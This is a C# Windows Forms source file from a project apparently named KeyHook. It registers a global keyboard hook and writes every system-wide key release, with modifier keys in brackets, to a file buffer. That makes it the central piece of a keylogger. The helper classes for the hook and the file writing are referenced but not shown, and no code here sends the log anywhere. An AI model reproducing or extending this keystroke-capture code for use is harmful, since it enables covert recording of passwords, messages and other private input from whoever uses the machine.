using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace KeyHook
{
    public partial class Form1 : Form
    {

        GlobalKeyboardHook gkh = new GlobalKeyboardHook();
        BufferManager bufferManager = new BufferManager();

        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            gkh.KeyDown += new KeyEventHandler(gkh_KeyDown);
            gkh.KeyUp += new KeyEventHandler(gkh_KeyUp);
            bufferManager.Start();
        }

        void gkh_KeyUp(object sender, KeyEventArgs e)
        {

            //if (GlobalKeyboardHook.IsModifier((int)e.KeyCode))
            //    txtKeys.Text += "[" + e.KeyCode.ToString() + "]";
            //else
            //    txtKeys.Text += e.KeyCode.ToString();

            FileBuffer buffer = FileBuffer.GetInstance();
            if (GlobalKeyboardHook.IsModifier((int)e.KeyCode))
                buffer.Write( "[" + e.KeyCode.ToString() + "]");
            else
                buffer.Write(e.KeyCode.ToString());
            //e.Handled = true;
        }

        void gkh_KeyDown(object sender, KeyEventArgs e)
        {
            //Do something
            //e.Handled = true;
        }

        private void Form1_FormClosed(object sender, FormClosedEventArgs e)
        {
            gkh.KeyDown -= new KeyEventHandler(gkh_KeyDown);
            gkh.KeyUp -= new KeyEventHandler(gkh_KeyUp);
            bufferManager.Stop();
        }
    }
}
